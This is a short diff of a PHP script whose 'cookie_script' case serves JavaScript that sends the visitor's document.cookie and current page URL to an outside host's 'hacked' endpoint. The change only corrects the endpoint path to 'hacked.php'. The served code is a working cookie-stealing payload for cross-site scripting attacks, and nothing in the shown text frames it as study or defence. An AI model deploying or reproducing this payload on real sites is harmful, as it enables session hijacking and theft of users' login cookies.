@@ -19,7 +19,7 @@ switch ($type) {
         }
         break;
     case 'cookie_script':
-        echo 'window.location="https://cdn.lucacastelnuovo.nl/scripts/hacked?type=cookie&cookie="+document.cookie+"&link="+window.location.href';
+        echo 'window.location="https://cdn.lucacastelnuovo.nl/scripts/hacked.php?type=cookie&cookie="+document.cookie+"&link="+window.location.href';
         exit;
 }
 ?>
